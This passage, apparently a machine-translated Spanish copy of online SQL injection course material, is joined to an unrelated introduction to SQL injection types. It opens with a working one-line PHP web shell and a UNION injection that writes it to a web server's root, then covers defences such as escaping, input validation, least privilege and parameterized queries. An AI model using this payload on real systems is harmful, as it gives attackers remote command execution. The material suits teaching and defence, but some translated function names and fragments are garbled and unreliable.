<?php system($_REQUEST[0]); ?>
```

Podemos reutilizar nuestro anterior `UNION` inyecte la carga útil y cambie la cadena a la anterior y el nombre del archivo a `shell.php`:

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

    ', “ “, “ “ en outfile '/var/www/html/shell.php'-- -'>

![](https://academy.hackthebox.com/storage/modules/33/write_shell.png)

Una vez más, no vemos ningún error, lo que significa que la escritura del archivo probablemente funcionó. Esto se puede verificar navegando al `/shell.php` archivar y ejecutar comandos a través del `0` parámetro, con `?0=id` en nuestra URL:


![](https://academy.hackthebox.com/storage/modules/33/write_shell_exec_1.png)

La salida de la `id` el comando confirma que tenemos ejecución de código y se está ejecutando como `www-data` usuario.

`0=[COMANDO]`

## Mitigación

### Desinfección de Entrada

Aquí está el fragmento del código de la sección de omisión de autenticación que discutimos anteriormente:

Código: php

```php
<SNIP>
  $username = $_POST['username'];
  $password = $_POST['password'];

  $query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
  echo "Executing query: " . $query . "<br /><br />";

  if (!mysqli_query($conn ,$query))
  {
          die('Error: ' . mysqli_error($conn));
  }

  $result = mysqli_query($conn, $query);
  $row = mysqli_fetch_array($result);
<SNIP>
```

Como podemos ver, el guión incluye el `username` y `password` desde la solicitud POST y la pasa a la consulta directamente. Esto permitirá que un atacante inyecte todo lo que desee y explote la aplicación. La inyección se puede evitar desinfectando cualquier entrada del usuario, haciendo que las consultas inyectadas sean inútiles. Las bibliotecas proporcionan múltiples funciones para lograr esto, un ejemplo de ello es el [mysqli_real_escape_cadena()](https://www.php.net/manual/en/mysqli.real-escape-string.php) función. Esta función escapa a caracteres como `'` y `"`'', por lo que no tienen ningún significado especial.

Código: php

```php
<SNIP>
$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = mysqli_real_escape_string($conn, $_POST['password']);

$query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
echo "Executing query: " . $query . "<br /><br />";
<SNIP>
```

El fragmento anterior muestra cómo se puede usar la función.

![mysqli_escape](https://academy.hackthebox.com/storage/modules/33/mysqli_escape.png)

Como se esperaba, la inyección ya no funciona debido a que se escapan de las comillas individuales. Un ejemplo similar es el [pg_escape_cadena()](https://www.php.net/manual/en/function.pg-escape-string.php) que solía escapar de las consultas PostgreSQL.

---

### Validación de Entrada

La entrada del usuario también se puede validar en función de los datos utilizados para la consulta para garantizar que coincida con la entrada esperada. Por ejemplo, al tomar un correo electrónico como entrada, podemos validar que la entrada es en forma de `...@email.com`y así sucesivamente.

Considere el siguiente fragmento de código de la página de puertos, que utilizamos `UNION` inyecciones en:

Código: php

```php
<?php
if (isset($_GET["port_code"])) {
	$q = "Select * from ports where port_code ilike '%" . $_GET["port_code"] . "%'";
	$result = pg_query($conn,$q);
    
	if (!$result)
	{
   		die("</table></div><p style='font-size: 15px;'>" . pg_last_error($conn). "</p>");
	}
<SNIP>
?>
```

Vemos el parámetro GET `port_code` ser utilizado en la consulta directamente. Ya se sabe que un código de puerto consiste solo en letras o espacios. Podemos restringir la entrada del usuario solo a estos caracteres, lo que evitará la inyección de consultas. Se puede usar una expresión regular para validar la entrada:

Código: php

```php
<SNIP>
$pattern = "/^[A-Za-z\s]+$/";
$code = $_GET["port_code"];

if(!preg_match($pattern, $code)) {
  die("</table></div><p style='font-size: 15px;'>Invalid input! Please try again.</p>");
}

$q = "Select * from ports where port_code ilike '%" . $code . "%'";
<SNIP>
```

El código se modifica para usar el [preg_match()](https://www.php.net/manual/en/function.preg-match.php) función, que comprueba si la entrada coincide con el patrón dado o no. El patrón utilizado es `[A-Za-z\s]+`, que solo coincidirá con cadenas que contengan letras y espacios. Cualquier otro carácter resultará en la terminación del script.

   

![](https://academy.hackthebox.com/storage/modules/33/postgres_copy_write.png)

Podemos probar la siguiente inyección:

Código: sql

```sql
'; SELECT 1,2,3,4-- -
```

   

![](https://academy.hackthebox.com/storage/modules/33/postgres_copy_write.png)

Como se ve en las imágenes de arriba, la entrada con consultas inyectadas fue rechazada por el servidor.

---

### Privilegios de Usuario

Como se discutió inicialmente, el software DBMS permite la creación de usuarios con permisos de grano fino. Debemos asegurarnos de que el usuario que consulta la base de datos solo tenga permisos mínimos.

Los superusuarios y usuarios con privilegios administrativos nunca deben ser utilizados con aplicaciones web. Estas cuentas tienen acceso a funciones y características, lo que podría llevar a un compromiso del servidor.

  Mitigación de la inyección SQL

```shell-session
MariaDB [(none)]> CREATE USER 'reader'@'localhost';

Query OK, 0 rows affected (0.002 sec)


MariaDB [(none)]> GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY 'p@ssw0Rd!!';

Query OK, 0 rows affected (0.000 sec)
```

Los comandos anteriores agregan un nuevo usuario de MariaDB llamado `reader` a quién se le concede solamente `SELECT` privilegios en el `ports` mesa. Podemos verificar los permisos para este usuario iniciando sesión:

  Mitigación de la inyección SQL

```shell-session
vcrdcr@htb[/htb]$ mysql -u reader -p

MariaDB [(none)]> use ilfreight;
MariaDB [ilfreight]> SHOW TABLES;

+---------------------+
| Tables_in_ilfreight |
+---------------------+
| ports               |
+---------------------+
1 row in set (0.000 sec)


MariaDB [ilfreight]> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

+--------------------+
| SCHEMA_NAME        |
+--------------------+
| information_schema |
| ilfreight          |
+--------------------+
2 rows in set (0.000 sec)


MariaDB [ilfreight]> SELECT * FROM ilfreight.credentials;
ERROR 1142 (42000): SELECT command denied to user 'reader'@'localhost' for table 'credentials'
```

El fragmento anterior confirma que el `reader` el usuario no puede consultar otras tablas en el `ilfreight` base de datos. El usuario solo tiene acceso a la `ports` tabla que necesita la aplicación.

---

### Firewall de Aplicaciones Web

Los Firewalls de aplicaciones web (WAF) se utilizan para detectar entradas maliciosas y rechazar cualquier solicitud HTTP que las contenga. Esto ayuda a prevenir la inyección SQL incluso cuando la lógica de la aplicación es defectuosa. Los WAF pueden ser de código abierto (ModSecurity) o premium (Cloudflare). La mayoría de ellos tienen reglas predeterminadas configuradas en función de ataques web comunes. Por ejemplo, cualquier solicitud que contenga la cadena `INFORMATION_SCHEMA` sería rechazado, ya que se usa comúnmente mientras se explota la inyección SQL.

---

### Consultas Parametrizadas

Otra forma de garantizar que la entrada se desinfecte de forma segura es mediante el uso de consultas parametrizadas. Las consultas parametrizadas contienen marcadores de posición para los datos de entrada, que luego son escapados y transmitidos por los conductores. En lugar de pasar directamente los datos a la consulta SQL, utilizamos marcadores de posición y luego los llenamos con funciones PHP.

Considere el siguiente código modificado:

Código: php

```php
<SNIP>
  $username = $_POST['username'];
  $password = $_POST['password'];

  $query = "SELECT * FROM logins WHERE username=? AND password = ?" ;
  $stmt = mysqli_prepare($conn, $query);
  mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
  mysqli_stmt_execute($stmt);
  $result = mysqli_stmt_get_result($stmt);

  $row = mysqli_fetch_array($result);
  mysqli_stmt_close($stmt);
<SNIP>
```

La consulta se modifica para contener dos marcadores de posición, marcados con `?` donde se colocará el nombre de usuario y la contraseña. Luego vinculamos el nombre de usuario y la contraseña a la consulta utilizando el [mysqli_stmt_bind_param()](https://www.php.net/manual/en/mysqli-stmt.bind-param.php) función. Esto escapará de forma segura a cualquier cita y colocará los valores en la consulta.

---

### Conclusión

La lista anterior no es exhaustiva, y aún podría ser posible explotar la inyección SQL en función de la lógica de la aplicación. Los ejemplos de código que se muestran se basan en PHP, pero la lógica se aplica a todos los lenguajes y bibliotecas comunes.



# Hack4o

## Introducción

**SQL Injection** (**SQLI**) es una técnica de ataque utilizada para explotar vulnerabilidades en aplicaciones web que **no validan adecuadamente** la entrada del usuario en la consulta SQL que se envía a la base de datos. Los atacantes pueden utilizar esta técnica para ejecutar consultas SQL maliciosas y obtener información confidencial, como nombres de usuario, contraseñas y otra información almacenada en la base de datos.

Las inyecciones SQL se producen cuando los atacantes insertan código SQL malicioso en los campos de entrada de una aplicación web. Si la aplicación no valida adecuadamente la entrada del usuario, la consulta SQL maliciosa se ejecutará en la base de datos, lo que permitirá al atacante obtener información confidencial o incluso controlar la base de datos.

Hay varios tipos de inyecciones SQL, incluyendo:

- **Inyección SQL basada en errores**: Este tipo de inyección SQL aprovecha **errores en el código SQL** para obtener información. Por ejemplo, si una consulta devuelve un error con un mensaje específico, se puede utilizar ese mensaje para obtener información adicional del sistema.
- **Inyección SQL basada en tiempo**: Este tipo de inyección SQL utiliza una consulta que **tarda mucho tiempo en ejecutarse** para obtener información. Por ejemplo, si se utiliza una consulta que realiza una búsqueda en una tabla y se añade un retardo en la consulta, se puede utilizar ese retardo para obtener información adicional
- **Inyección SQL basada en booleanos**: Este tipo de inyección SQL utiliza consultas con **expresiones booleanas** para obtener información adicional. Por ejemplo, se puede utilizar una consulta con una expresión booleana para determinar si un usuario existe en una base de datos.
- **Inyección SQL basada en uniones**: Este tipo de inyección SQL utiliza la cláusula “**UNION**” para combinar dos o más consultas en una sola. Por ejemplo, si se utiliza una consulta que devuelve información sobre los usuarios y se agrega una cláusula “**UNION**” con otra consulta que devuelve información sobre los permisos, se puede obtener información adicional sobre los permisos de los usuarios.
- **Inyección SQL basada en stacked queries**: Este tipo de inyección SQL aprovecha la posibilidad de **ejecutar múltiples consultas** en una sola sentencia para obtener información adicional. Por ejemplo, se puede utilizar una consulta que inserta un registro en una tabla y luego agregar una consulta adicional que devuelve información sobre la tabla.

Cabe destacar que, además de las técnicas citadas anteriormente, existen muchos otros tipos de inyecciones SQL. Sin embargo, estas son algunas de las más populares y comúnmente utilizadas por los atacantes en páginas web vulnerables.

Asimismo, es necesario hacer una breve distinción de los diferentes tipos de bases de datos existentes:

- **Bases de datos relacionales**: Las inyecciones SQL son más comunes en bases de datos relacionales como MySQL, SQL Server, Oracle, PostgreSQL, entre otros. En estas bases de datos, se utilizan consultas SQL para acceder a los datos y realizar operaciones en la base de datos.
- **Bases de datos NoSQL**: Aunque las inyecciones SQL son menos comunes en bases de datos NoSQL, todavía es posible realizar este tipo de ataque. Las bases de datos NoSQL, como MongoDB o Cassandra, no utilizan el lenguaje SQL, sino un modelo de datos diferente. Sin embargo, es posible realizar inyecciones de comandos en las consultas que se realizan en estas bases de datos. Esto lo veremos unas clases más adelante.
- **Bases de datos de grafos**: Las bases de datos de grafos, como Neo4j, también pueden ser vulnerables a inyecciones SQL. En estas bases de datos, se utilizan consultas para acceder a los nodos y relaciones que se han almacenado en la base de datos.
- **Bases de datos de objetos**: Las bases de datos de objetos, como db4o, también pueden ser vulnerables a inyecciones SQL. En estas bases de datos, se utilizan consultas para acceder a los objetos que se han almacenado en la base de datos.

Es importante entender los diferentes tipos de inyecciones SQL y cómo pueden utilizarse para obtener información confidencial y controlar una base de datos. Los desarrolladores deben asegurarse de validar adecuadamente la entrada del usuario y de utilizar técnicas de defensa, como la sanitización de entrada y la preparación de consultas SQL, para prevenir las inyecciones SQL en sus aplicaciones web.

A continuación, se proporciona el enlace a la utilidad online de ‘**ExtendsClass**‘ que utilizamos en esta clase:

- **ExtendsClass MySQL Online**: [https://extendsclass.com/mysql-online.html](https://extendsclass.com/mysql-online.html)


## 1

